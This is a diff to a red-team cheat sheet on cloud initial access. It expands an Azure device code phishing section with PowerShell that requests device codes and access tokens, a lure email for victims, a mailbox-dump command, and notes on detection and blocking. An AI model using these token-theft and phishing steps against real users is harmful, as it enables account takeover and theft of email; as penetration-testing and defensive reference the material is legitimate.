@@ -1,6 +1,6 @@
 # Initial access attacks
 
-* [Password and crentials attacks](#Password--and-credentials-attacks)
+* [Password and credentials](#Password-and-credentials)
   * [Password spraying](#Password-spraying)
   * [Bypass MFA](#Bypass-MFA)
   * [Key disclosure in public repositories](#Key-disclosure-in-public-repositories)
@@ -15,7 +15,8 @@
   * [Evilginx2](#Evilginx2)
   * [Illicit Consent Grant](#Illicit-Consent-Grant)
   * [Email Spoofing](#Email-spoofing)
-  * [Device code auth](#Device-code-auth)
+  * [Azure Device Code](#Azure-Device-Code)
+    * [Dynamic device code phishing](#Dynamic-device-code-phishing)
   * [Google workspace calendar event injection](#Google-workspace-calendar-event-injection)
 * [Public storage](#public-storage)
   * [Azure storage accounts](#Azure-storage-accounts)
@@ -23,7 +24,7 @@
   * [Google Storage Buckets](#Google-Storage-Buckets)
 * [Misc](#misc)
 
-## Password and credentials attacks
+## Password and credentials
 ### Password spraying
 - https://github.com/dafthack/MSOLSpray
 - https://github.com/ustayready/fireprox
@@ -57,6 +58,12 @@ Invoke-MFASweep -Username <EMAIL> -Password <PASSWORD>
   - Gitleaks https://github.com/zricethezav/gitleaks
   - Gitrob https://github.com/michenriksen/gitrob
   - Truffle hog https://github.com/dxa4481/truffleHog
+- Common abuses
+  - Secrets (Credentials, API keys, Tokens) in repositories
+  - Compromising a user with commit rights
+  - Hosting malware
+  - Abusing GitHub actions and workflows to trigger builds/execute code or perform an action
+    - Workflow can run in a VM
 
 ### Gitleaks
 - https://github.com/zricethezav/gitleaks
@@ -70,6 +77,9 @@ Invoke-MFASweep -Username <EMAIL> -Password <PASSWORD>
 ```
 https://github.com/[git account]/[repo name]/commit/[commit ID]
 ```
+
+#### GitHub Personal Access Token
+- A GitHub Personal Access Token starts with `github_pat_<TOKEN>`
 
 ## Reused access 
 - certs as private keys on web servers
@@ -252,6 +262,7 @@ reg.Header.Set(string(b), nothing_to_see_here)
 
 ## Illicit Consent Grant
 - Verified publisher: https://techcommunity.microsoft.com/t5/microsoft-entra-azure-ad-blog/publisher-verification-and-app-consent-policies-are-now/ba-p/1257374
+- User Consent setting - "Allow user consent for apps from verified publishers, for selected permissions" (Note that this doesn't stop consent for applications from the same tenant as thetarget)
 
 #### Check if users are allowed to consent to apps
 - Requires a valid account in the target tenant
@@ -331,44 +342,74 @@ python 365-Stealer.py --refresh-all
 Send-MailMessage -SmtpServer CompanyDomain-com.mail.protection.outlook.com -Subject “Subject Here” -To ‘Full Name <user2@companyDomain.com>‘ -From ‘From Full Name <user1@companyDomain.com>‘ -Body “Hello From your Co-worker” -BodyAsHtml
 ```
 
-### Device code auth
-- https://aadinternals.com/post/phishing/
-- https://www.offsec-journey.com/post/phishing-with-azure-device-codes
-- https://www.youtube.com/watch?v=GZ_nn0uRLr4
+### Azure Device Code
+- Device Code is used to login to devices that have input validations
+- Flow:
+	- Enter code on device on https://microsoft.com/devicelogin
+	- Perform normal authentication, including MFA as user
+	- On successful login the device gets access and refresh tokens
+	- [MS link](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code#protocol-diagram)
+- Links
+  - https://aadinternals.com/post/phishing/
+  - https://www.offsec-journey.com/post/phishing-with-azure-device-codes
+  - https://www.youtube.com/watch?v=GZ_nn0uRLr4
+  - https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html
+- Block device auth flow: https://learn.microsoft.com/en-us/entra/identity/conditional-access/how-to-policy-authentication-flows
 
-### Example TokenTactics
-- https://github.com/rvrsh3ll/TokenTactics
-
-#### Request Device Code token
-- Copy the Device code
+#### Manually request device code
+- Code is only valid for 15 minutes!
+- There are multiple methods to request device codes. A few examples below:
+- Manually version 1 API
+  - Scope = all default permissions and `offline_access`
+  - The scope `offline_access` instructs the Azure AD to return a refresh token in addition to an access token and ID token.
+  - Copy the `user_code`
+  - Can replace `common` in url with `consumers`, `organizations`, `tenant ID` or `tenant domain`
 
 ```
-ipmo .\TokenTactics-main\TokenTactics.psd1
+$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+$Resource = "https://graph.windows.net/"
+
+$body = @{
+	"client_id" = $ClientID 
+	"resource" = $Resource
+}
+
+$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
+
+Write-Output $authResponse
+```
+
+- Manually version 2 API
+```
+$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+$Scope = ".default offline_access"
+
+$body = @{
+	"client_id" = $ClientID 
+	"scope" = $Scope
+}
+
+$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body $body
+
+Write-Output $authResponse
+```
+
+- Graphspy https://github.com/RedByte1337/GraphSpy
+	- Go to device codes and generate one
+```
+python.exe .\GraphSpy-master\GraphSpy\GraphSpy.py
+```
+
+
+- Tokentactics https://github.com/rvrsh3ll/TokenTactics
+```
+Import-Module .\TokenTactics.psd1
 
 Get-AzureToken -Client MSGraph
 ```
 
-#### Send device code to the target
-- Email example:
-```
-Dear <USER>,
-
-Use the Code to access the content of the website: https://microsoft.com/devicelogin
-
-Code: <CODE>
-```
-
-#### Capture Access Token
-- Once the user registers the device, TokenTactics will capture the token. This is saved in `$response.access_token`
-
-#### Post exploitation
-- Example dump mailbox with TokenTactics:
-```
-Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder  
-AllItems
-```
-
 #### Common application ID's
+- https://learn.microsoft.com/en-us/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in
 ```
 ACOM Azure Website 	23523755-3a2b-41ca-9315-f81f3f566a95
 AEM-DualAuth 	69893ee3-dd10-4b1c-832d-4870354be3d8
@@ -382,6 +423,71 @@ Bing 	9ea1ad79-fdb6-4f9a-8bc3-2b70f96e34c7
 CPIM Service 	bb2a2e3a-c5e7-4f0a-88e0-8e01fd3fc1f4
 CRM Power BI Integration 	e64aa8bc-8eb4-40e2-898b-cf261a25954f
 ```
+
+#### Send device code to the target
+- Email example:
+```
+Dear <USER>,
+
+Use the Code to access the content of the website: https://microsoft.com/devicelogin
+
+Code: <CODE>
+```
+
+#### Request access token
+- Uses the device code from `$authResponse.device_code`
+- Manually version 1 API
+```
+$GrantType = "urn:ietf:params:oauth:grant-type:device_code"
+
+$body=@{
+	"client_id" = $ClientID
+	"grant_type" = $GrantType
+	"code" = $authResponse.device_code
+	"resource" = $Resource
+}
+
+$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
+$GraphAccessToken = $Tokens.access_token
+
+$GraphAccessToken
+```
+
+- Manually version 2 API
+```
+$GrantType = "urn:ietf:params:oauth:grant-type:device_code"
+
+$body=@{
+	"client_id" = $ClientID
+	"grant_type" = $GrantType
+	"code" = $authResponse.device_code
+}
+$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body -ErrorAction SilentlyContinue
+$GraphAccessToken = $Tokens.access_token
+
+$GraphAccessToken 
+```
+
+- Graph spy and token tactics automatically pulls for the access token
+
+#### Post exploitation
+- Example dump mailbox with TokenTactics:
+```
+Dump-OWAMailboxViaMSGraphApi -AccessToken $response.access_token -mailFolder  
+AllItems
+```
+
+### Dynamic device code phishing
+- Dynamically request codes and give them to the user on a webpage to
+- https://www.blackhillsinfosec.com/dynamic-device-code-phishing/
+
+#### Defense
+- Logs
+  - Attacker IP and device that is logged in Entra ID Sign-in logs
+  - Sign in with Authentication Protocol: Device Code
+- Conditional Access
+  - Location based policy
+  - Block device code flow [Documentation](https://learn.microsoft.com/en-us/entra/identity/conditional-access/how-to-policy-authentication-flows)
 
 ### Google workspace calendar event injection
 - Silently injects events to target calendars
